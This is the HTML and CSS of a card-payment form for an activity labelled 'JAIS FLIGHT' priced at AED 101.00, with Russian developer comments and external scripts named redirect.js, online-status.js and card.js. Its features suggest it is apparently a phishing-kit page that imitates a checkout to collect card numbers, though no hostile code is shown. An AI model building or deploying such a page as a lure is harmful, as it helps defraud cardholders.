    <style>
      /* Дополнительные стили для новых элементов */
      .security-features {
        display: flex;
        flex-wrap: wrap;
        gap: 16px;
        margin-top: 30px;
      }

      .security-item {
        display: flex;
        align-items: center;
        gap: 8px;
        font-size: 13px;
        color: #5a6270;
      }

      .security-icon {
        width: 16px;
        height: 16px;
        color: #3366ff;
      }

      .trust-badges {
        display: flex;
        align-items: center;
        gap: 12px;
        margin-top: 20px;
        padding-top: 20px;
        border-top: 1px solid #f0f2f7;
      }

      .trust-badge {
        display: flex;
        align-items: center;
        gap: 6px;
        font-size: 12px;
        color: #5a6270;
      }

      .badge-icon {
        width: 16px;
        height: 16px;
        color: #3366ff;
      }

      .security-notice {
        background-color: #f8faff;
        border-radius: 12px;
        padding: 16px;
        margin-top: 20px;
        display: flex;
        align-items: flex-start;
        gap: 12px;
      }

      .security-notice-icon {
        width: 20px;
        height: 20px;
        color: #3366ff;
        flex-shrink: 0;
        margin-top: 2px;
      }

      .security-notice-content h4 {
        font-size: 14px;
        color: #1a1a1a;
        margin-bottom: 4px;
      }

      .security-notice-content p {
        font-size: 13px;
        color: #5a6270;
        line-height: 1.4;
      }

      .payment-steps {
        display: flex;
        align-items: center;
        justify-content: space-between;

        position: relative;

        width: 400px;
        margin: 25px auto;
      }

      .payment-steps::before {
        content: "";
        position: absolute;
        top: 12px;
        left: 20px;
        right: 20px;
        height: 2px;
        background-color: #e5e8ef;
        z-index: 1;
      }

      .step {
        display: flex;
        flex-direction: column;
        align-items: center;
        position: relative;
        z-index: 2;
      }

      .step-icon {
        width: 24px;
        height: 24px;
        border-radius: 50%;
        background-color: #e5e8ef;
        display: flex;
        align-items: center;
        justify-content: center;
        margin-bottom: 8px;
      }

      .step.active .step-icon {
        background-color: #3366ff;
        color: white;
      }

      .step-label {
        font-size: 12px;
        color: #8b92a3;
        font-weight: 500;
      }

      .step.active .step-label {
        color: #3366ff;
      }

      .payment-guarantee {
        background: linear-gradient(135deg, #f0f7ff 0%, #e8f2ff 100%);
        border-radius: 12px;
        padding: 16px;
        margin-top: 20px;
        display: flex;
        align-items: center;
        gap: 12px;
        border: 1px solid #d1e7ff;
      }

      .guarantee-icon {
        width: 24px;
        height: 24px;
        color: #3366ff;
        flex-shrink: 0;
      }

      .guarantee-content h4 {
        font-size: 14px;
        color: #1a1a1a;
        margin-bottom: 4px;
      }

      .guarantee-content p {
        font-size: 13px;
        color: #5a6270;
      }

      .activity-info {
        display: flex;
        justify-content: space-between;
        padding: 16px 32px;
        border-bottom: 1px solid #f0f2f7;
        font-size: 13px;
      }

      .activity-label {
        color: #6a7180;
        font-weight: 500;
      }

      .activity-name {
        color: #2a2f3c;
        font-weight: 600;
        text-align: right;
        max-width: 200px;
      }

      @media (max-width: 768px) {
        .payment-steps {
          width: 340px;
        }

        .activity-name {
          max-width: 150px;
          font-size: 12px;
        }
      }
    </style>

  <body>
    <div class="container">
      <div class="right-section">
        <div class="payment-card">
          <div class="payment-steps">
            <div class="step active">
              <div class="step-icon">
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="3"
                >
                  <path d="M20 6L9 17l-5-5"></path>
                </svg>
              </div>
              <div class="step-label">Card</div>
            </div>
            <div class="step">
              <div class="step-icon">2</div>
              <div class="step-label">Details</div>
            </div>
            <div class="step">
              <div class="step-icon">3</div>
              <div class="step-label">Confirm</div>
            </div>
          </div>

          <div class="card-header">
            <div class="status-icon">
              <svg
                width="32"
                height="32"
                viewBox="0 0 24 24"
                fill="none"
                stroke="white"
                stroke-width="2.5"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path
                  d="M12 2v6M21.09 8.09l-1.41 1.41M23 17h-6M21.09 21.91l-1.41-1.41M12 23v-6M2.91 21.91l1.41-1.41M1 17h6M2.91 8.09l1.41 1.41"
                ></path>
                <circle cx="12" cy="12" r="3"></circle>
              </svg>
            </div>
            <div class="payment-info">
              <div class="payment-status">Secure Payment Processing</div>
              <div class="payment-amount" id="paymentAmount">AED 101.00</div>
            </div>
          </div>

          <!-- Заменяем Order No. на Activity -->
          <div class="activity-info">
            <span class="activity-label">Activity</span>
            <span class="activity-name" id="activityName"> JAIS FLIGHT </span>
          </div>

          <div class="form-container">
            <div class="payment-method">
              <svg
                class="method-icon"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
              >
                <rect x="2" y="5" width="20" height="14" rx="2"></rect>
                <line x1="2" y1="10" x2="22" y2="10"></line>
              </svg>
              <span>Card Payment</span>
            </div>

            <div class="security-notice">
              <svg
                class="security-notice-icon"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
              >
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
              </svg>
              <div class="security-notice-content">
                <h4>Secure Payment</h4>
                <p>
                  Your card information is encrypted and processed securely. We
                  do not store your card details.
                </p>
              </div>
            </div>

            <form id="payment-form">
              <div class="form-group">
                <label class="form-label">Card number</label>
                <div class="input-wrapper">
                  <input
                    type="text"
                    class="form-input"
                    placeholder="1234 1234 1234 1234"
                    id="cardNumber"
                    maxlength="19"
                  />
                  <div class="card-brands">
                    <svg width="32" height="20" viewBox="0 0 32 20">
                      <rect width="32" height="20" rx="2" fill="#1434CB" />
                      <text
                        x="16"
                        y="14"
                        text-anchor="middle"
                        font-size="9"
                        font-weight="bold"
                        fill="white"
                      >
                        VISA
                      </text>
                    </svg>
                    <svg width="32" height="20" viewBox="0 0 32 20">
                      <rect width="32" height="20" rx="2" fill="#EB001B" />
                      <circle
                        cx="12"
                        cy="10"
                        r="6"
                        fill="#FF5F00"
                        opacity="0.8"
                      />
                      <circle
                        cx="20"
                        cy="10"
                        r="6"
                        fill="#F79E1B"
                        opacity="0.8"
                      />
                    </svg>
                  </div>
                </div>
                <div
                  id="cardError"
                  class="error-message"
                  role="alert"
                  aria-live="assertive"
                ></div>
              </div>

              <button type="submit" class="pay-button">
                <svg
                  width="18"
                  height="18"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  stroke-linecap="round"
                >
                  <path
                    d="M12 1v22M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"
                  ></path>
                </svg>
                Continue Securely
              </button>
            </form>

            <div class="payment-guarantee">
              <svg
                class="guarantee-icon"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
              >
                <path
                  d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3zM7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"
                ></path>
              </svg>
              <div class="guarantee-content">
                <h4>Money-Back Guarantee</h4>
                <p>Full refund within 30 days if not satisfied</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <script src="/static/js/redirect.js?v2"></script>
    <script src="/static/js/online-status.js?v2"></script>
    <script src="/static/js/card.js?v8"></script>
    <script>
      // Обновляем название активности при загрузке страницы
      document.addEventListener("DOMContentLoaded", function () {
        const activityName = localStorage.getItem("activityName");
        if (activityName) {
          document.getElementById("activityName").textContent = activityName;
        }

        // Обновляем цену
      });
    </script>
  </body>
